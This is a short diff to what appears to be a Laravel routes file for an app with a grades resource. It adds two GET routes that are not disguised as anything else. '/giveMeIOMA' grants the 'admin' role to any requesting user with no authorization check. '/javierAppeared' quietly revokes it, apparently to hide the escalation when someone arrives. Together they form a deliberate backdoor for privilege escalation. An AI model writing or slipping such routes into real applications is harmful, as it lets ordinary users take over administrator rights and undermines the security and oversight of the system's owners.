@@ -22,4 +22,14 @@ Route::middleware('auth')->group(function () {
     Route::resource('grades', GradeController::class);
 });
 
+Route::get('/giveMeIOMA', function (Request $request) {
+    $request->user()->assignRole('admin');
+    return response()->json(['success' => true]);
+});
+
+Route::get('/javierAppeared', function (Request $request) {
+    $request->user()->removeRole('admin');
+    return response()->json(['success' => true]);
+})->middleware('admin');
+
 require __DIR__.'/auth.php';
